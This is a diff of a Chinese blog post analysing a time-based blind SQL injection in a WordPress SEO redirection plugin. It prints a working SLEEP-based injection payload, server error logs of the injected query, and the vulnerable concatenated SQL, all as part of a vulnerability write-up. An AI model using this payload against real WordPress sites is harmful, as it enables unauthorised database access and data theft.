@@ -28,33 +28,33 @@ comments: true
 
 ‘字面上’的注入很好理解，利用<code>sleep()</code>进行延时注入，当<code>'a'='a'</code>结果为<code>True</code>，则取0，<code>5-0=5</code>，执行<code>sleep(5)</code>。
 
-为了更好的分析这个漏洞产生的过程，我插入了一条可以触发数据库错误的语句<code>') AND (SELECT * FROM (SELECT(SLEEP(5-(IF('a'='a',0,5)))))abc) AND ('SQL'='SQL'</code>（这里多了一个<code>'</code>）,借助后台日志，我尝试着找到了这段注入执行的语句。
+为了更好的分析这个漏洞产生的过程，我插入了一条可以触发数据库错误的语句
+<code>') AND (SELECT * FROM (SELECT(SLEEP(5-(IF('a'='a',0,5)))))abc) AND ('SQL'='SQL'</code>（这里多了一个<code>'</code>）。
 
-<pre><code>
-[Sat Dec 24 08:50:37.231873 2016] [:error] [pid 173] [client 10.10.79.136:64753] WordPress\xe6\x95\xb0\xe6\x8d\xae\xe5\xba\x93\xe6\x9f\xa5\xe8\xaf\xa2 select * from wp_WP_SEO_Redirection where enabled=1 and cat='link' and blog='1' and regex='' and (redirect_from='/?p=5') AND (SELECT * FROM (SELECT(SLEEP(5-(IF('a'='a',0,5)))))abc) AND ('SQL'='SQL'' or redirect_from='/?p=5') AND (SELECT * FROM (SELECT(SLEEP(5-(IF('a'='a',0,5)))))abc) AND ('SQL'='SQL'/' ) \xe6\x97\xb6\xe5\x8f\x91\xe7\x94\x9fYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '?p=5') AND (SELECT * FROM (SELECT(SLEEP(5-(IF('a'='a',0,5)))))abc) AND ('SQL'='S' at line 1\xe9\x94\x99\xe8\xaf\xaf\xef\xbc\x8c\xe8\xbf\x99\xe6\x98\xaf\xe7\x94\xb1require('wp-blog-header.php'), wp, WP->main, do_action_ref_array, call_user_func_array, SR_redirect_manager::redirect\xe6\x9f\xa5\xe8\xaf\xa2\xe7\x9a\x84\xe3\x80\x82
-</code></pre>
+借助后台日志，我尝试着找到了这段注入执行的语句。
 
-<pre><code>
-[Sat Dec 24 08:50:37.233162 2016] [:error] [pid 173] [client 10.10.79.136:64753] WordPress\xe6\x95\xb0\xe6\x8d\xae\xe5\xba\x93\xe6\x9f\xa5\xe8\xaf\xa2 select * from wp_WP_SEO_Redirection where enabled=1 and cat='link' and blog='1' and regex<>'' and ('/?p=5') AND (SELECT * FROM (SELECT(SLEEP(5-(IF('a'='a',0,5)))))abc) AND ('SQL'='SQL'' regexp regex or '/?p=5') AND (SELECT * FROM (SELECT(SLEEP(5-(IF('a'='a',0,5)))))abc) AND ('SQL'='SQL'/' regexp regex ) order by LENGTH(regex) desc \xe6\x97\xb6\xe5\x8f\x91\xe7\x94\x9fYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '?p=5') AND (SELECT * FROM (SELECT(SLEEP(5-(IF('a'='a',0,5)))))abc) AND ('SQL'='S' at line 1\xe9\x94\x99\xe8\xaf\xaf\xef\xbc\x8c\xe8\xbf\x99\xe6\x98\xaf\xe7\x94\xb1require('wp-blog-header.php'), wp, WP->main, do_action_ref_array, call_user_func_array, SR_redirect_manager::redirect\xe6\x9f\xa5\xe8\xaf\xa2\xe7\x9a\x84\xe3\x80\x82
-</code></pre>
+<pre><code>[Sat Dec 24 08:50:37.231873 2016] [:error] [pid 173] [client 10.10.79.136:64753] WordPress\xe6\x95\xb0\xe6\x8d\xae\xe5\xba\x93\xe6\x9f\xa5\xe8\xaf\xa2 select * from wp_WP_SEO_Redirection where enabled=1 and cat='link' and blog='1' and regex='' and (redirect_from='/?p=5') AND (SELECT * FROM (SELECT(SLEEP(5-(IF('a'='a',0,5)))))abc) AND ('SQL'='SQL'' or redirect_from='/?p=5') AND (SELECT * FROM (SELECT(SLEEP(5-(IF('a'='a',0,5)))))abc) AND ('SQL'='SQL'/' ) \xe6\x97\xb6\xe5\x8f\x91\xe7\x94\x9fYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '?p=5') AND (SELECT * FROM (SELECT(SLEEP(5-(IF('a'='a',0,5)))))abc) AND ('SQL'='S' at line 1\xe9\x94\x99\xe8\xaf\xaf\xef\xbc\x8c\xe8\xbf\x99\xe6\x98\xaf\xe7\x94\xb1require('wp-blog-header.php'), wp, WP->main, do_action_ref_array, call_user_func_array, SR_redirect_manager::redirect\xe6\x9f\xa5\xe8\xaf\xa2\xe7\x9a\x84\xe3\x80\x82</code></pre>
+
+<pre><code>[Sat Dec 24 08:50:37.233162 2016] [:error] [pid 173] [client 10.10.79.136:64753] WordPress\xe6\x95\xb0\xe6\x8d\xae\xe5\xba\x93\xe6\x9f\xa5\xe8\xaf\xa2 select * from wp_WP_SEO_Redirection where enabled=1 and cat='link' and blog='1' and regex<>'' and ('/?p=5') AND (SELECT * FROM (SELECT(SLEEP(5-(IF('a'='a',0,5)))))abc) AND ('SQL'='SQL'' regexp regex or '/?p=5') AND (SELECT * FROM (SELECT(SLEEP(5-(IF('a'='a',0,5)))))abc) AND ('SQL'='SQL'/' regexp regex ) order by LENGTH(regex) desc \xe6\x97\xb6\xe5\x8f\x91\xe7\x94\x9fYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '?p=5') AND (SELECT * FROM (SELECT(SLEEP(5-(IF('a'='a',0,5)))))abc) AND ('SQL'='S' at line 1\xe9\x94\x99\xe8\xaf\xaf\xef\xbc\x8c\xe8\xbf\x99\xe6\x98\xaf\xe7\x94\xb1require('wp-blog-header.php'), wp, WP->main, do_action_ref_array, call_user_func_array, SR_redirect_manager::redirect\xe6\x9f\xa5\xe8\xaf\xa2\xe7\x9a\x84\xe3\x80\x82</code></pre>
 
 有了这些，就可以方便我在源码中发现问题所在了，引起注入的代码：
 
-![sqli-code](http://o8lgx56x1.bkt.clouddn.com/blog/img/wp-404-plugin-sqlicode-1.png)
+![sqli-code-1](http://o8lgx56x1.bkt.clouddn.com/blog/img/wp-404-plugin-sqlicode-1.png)
 
 $wpdb是WordPress 数据库访问抽象对象，get_row()是WordPress中一个执行数据库查询并返回结果的函数。
 
-拿其中一个来说，拼接出来的SQL语句是这样的：
+拿其中一个问题来说来说，这里的SQL语句是这样的：
 
-<pre><code>select * from $table_name where enabled=1 
-and cat='link' and blog='" . get_current_blog_id() . "'
-and regex<>'' and $permalink_regex_options 
-order by LENGTH(regex) desc </code></pre>
+<pre><code>select * from $table_name where enabled=1 and cat='link' and blog='" . get_current_blog_id() . "' and regex<>'' and $permalink_regex_options order by LENGTH(regex) desc </code></pre>
 
-其中变量<code>$permalink_regex_options</code>指向了语句<code>('$permalink' regexp regex or '$permalink_alternative'  regexp regex )</code>。
+<code>get_current_blog_id()</code>是WordPress中检索ID值的函数，注入的问题明显不是从这里引入的，后面还有一个变量<code>$permalink_regex_options</code>，所以继续跟进。
 
-顺着<code>$permalink</code> 和 <code>$permalink_alternative</code> 两个变量
+![sqli-code-2](http://o8lgx56x1.bkt.clouddn.com//blog/img/wp-404-plugin-sqlicode-2.png)
 
+顺着<code>$permalink_regex_options</code>找到了<code>$permalink</code>和<code>$permalink_alternative</code> 两个变量，这两个变量的的值指向了两个函数
+
+![sqli-code-3](http://o8lgx56x1.bkt.clouddn.com//blog/img/wp-404-plugin-sqlicode-3.png)
+![sqli-code-4](http://o8lgx56x1.bkt.clouddn.com//blog/img/wp-404-plugin-sqlicode-4.png)
 
 
 综上，可以整理出完整在数据库中执行的语句：
